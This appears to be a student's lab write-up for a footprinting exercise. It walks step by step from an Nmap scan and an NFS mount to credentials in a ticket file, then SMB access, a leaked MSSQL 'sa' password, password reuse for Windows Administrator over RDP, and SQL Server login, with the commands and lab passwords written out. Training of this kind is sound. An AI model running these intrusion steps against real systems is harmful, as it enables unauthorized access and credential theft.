# Footprinting Lab — Medium

## Goal
Find credentials → access SMB → retrieve sensitive file

---

## 1. Initial Scan
- Run Nmap scan
- Notice **NFS (port 2049)** is open
- Also see **SMB (port 445)**

---

## 2. Mount NFS Share
- Create mount folder:
  - `mkdir ~/TechSupport_mount`
- Mount NFS:
  - `sudo mount -t nfs 10.129.8.4:/TechSupport ~/TechSupport_mount -o nolock`

---

## 3. Enumerate Files
- List files as root:
  - `sudo ls -la ~/TechSupport_mount`

> Why: Shows permissions + avoids "Permission denied"

---

## 4. Find Credentials
- Read ticket file:
  - `cat ~/TechSupport_mount/ticket_12345.txt`

**Credentials found:**
- Username: `alex`
- Password: `lol123!mD`

---

## 5. Access SMB
- List shares:
  - `smbclient -L //10.129.9.192 -U 'alex%lol123!mD'`

- Connect to share:
  - `smbclient //10.129.11.133/devshare -U 'alex%lol123!mD'`

---

## 6. Retrieve File
- Download file:
  - `get important.txt`

- Exit + read:
  - `cat important.txt`

---

## 7. find credentials
- Found credentials:
  - `sa:87N1ns@slls83`

> `sa` = default **MSSQL admin account**


---

## 8. Password Reuse Attempt
- Found password: `87N1ns@slls83`
- Try it on common accounts

**Guess:**
- Username: `Administrator` (default Windows admin)
- Password: `87N1ns@slls83`

> Works → confirms password reuse

---

## 9. RDP Access
- Connect using:
  - `xfreerdp /v:<IP> /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution`

**What it does:**
- Remote access to Windows machine
- Use found credentials to log in

> Certificate warning is normal → press `Y`

---

## 10. Access SQL Server (SSMS)
- Open **SQL Server Management Studio**

**Login details:**
- Server type: `Database Engine`
- Username: `sa`
- Password: `87N1ns@slls83`

> `sa` = SQL Server admin account

---

## Final Summary (Full Flow)
Nmap → NFS → Mount → Find creds → SMB → Get file → Extract password → Password reuse → RDP → SQL access

![[Pasted image 20260317173614.png]]